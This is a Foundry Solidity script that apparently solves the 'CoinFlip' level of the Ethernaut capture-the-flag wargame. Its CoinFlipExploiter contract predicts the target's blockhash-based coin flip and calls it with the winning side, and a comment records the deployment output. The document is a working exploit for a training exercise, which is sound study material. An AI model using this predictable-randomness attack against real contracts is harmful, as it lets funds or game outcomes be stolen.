pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;
import "../instances/Ilevel03.sol";
import "forge-std/Script.sol";

contract Level03 is Script {
    CoinFlipExploiter coinFlipExploiter =
        CoinFlipExploiter(payable(0x2779e7BAbD9b91374505Fc16335c6339af5c532C));
    CoinFlip level03 =
        CoinFlip(payable(0xde01848Ea45Aa35c06d0Ef9781e4182ac48d7902));

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        console.log("Current consecutiveWins is %s", level03.consecutiveWins());
        coinFlipExploiter.flip();
        console.log("Current consecutiveWins is %s", level03.consecutiveWins());
        vm.stopBroadcast();
    }
}

// ❯ source .env
// ❯ forge create --private-key $PRIVATE_KEY script/level03.sol:CoinFlipExploiter
// [⠔] Compiling...
// [⠘] Compiling 1 files with 0.8.22
// [⠒] Solc 0.8.22 finished in 3.37s
// Compiler run successful!
// Deployer: 0xeBa6363c989f8A3BeA1709E736c3b04273350A07
// Deployed to: 0x2779e7BAbD9b91374505Fc16335c6339af5c532C
// Transaction hash: 0x2e140eca6333710d0306cf50767c32badc1885e821e966ec50ea5c508c3f01ab
contract CoinFlipExploiter {
    CoinFlip level03 =
        CoinFlip(payable(0xde01848Ea45Aa35c06d0Ef9781e4182ac48d7902));

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = level03.flip(side);
        return success;
    }
}
